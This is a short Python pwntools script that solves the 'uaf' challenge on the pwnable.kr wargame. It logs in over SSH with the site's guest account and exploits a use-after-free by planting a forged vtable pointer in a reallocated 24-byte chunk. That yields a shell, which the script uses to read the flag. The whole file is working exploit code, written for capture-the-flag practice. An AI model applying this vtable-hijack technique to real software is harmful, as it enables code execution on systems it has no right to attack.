import pwnlib.tubes.process
from pwn import *


def send_cmd(p: pwnlib.tubes.process.process, cmd: str) -> None:
    print(cmd)
    p.sendline(cmd.encode())
    print(p.recv().decode())


# We need to recreate the Man object, with a different address for the VTable
# We don't care what is in the name and age fields
man_obj = p64(0x401568) + p64(0xdeadbeef) + p64(0xcafebabe)

# Also, the allocated size for the man object is 24 bytes
MAN_ALLOC_SIZE = 24

conn = ssh(host="pwnable.kr", port=2222, password="guest")

# Run binary
p = conn.process(["uaf", str(MAN_ALLOC_SIZE), "/dev/stdin"])
print(p.recv().decode())

send_cmd(p, "3")

# Woman Object
p.sendline("2".encode())
p.sendline(man_obj)
print(p.recv().decode())

sleep(1)

# Man Object
p.sendline("2".encode())
p.sendline(man_obj)
print(p.recv().decode())

sleep(1)

# Now, we use our "fake" vtable
p.sendline("1".encode())

sleep(1)

# We got the shelllll
send_cmd(p, "cat flag")
print(p.recv().decode())

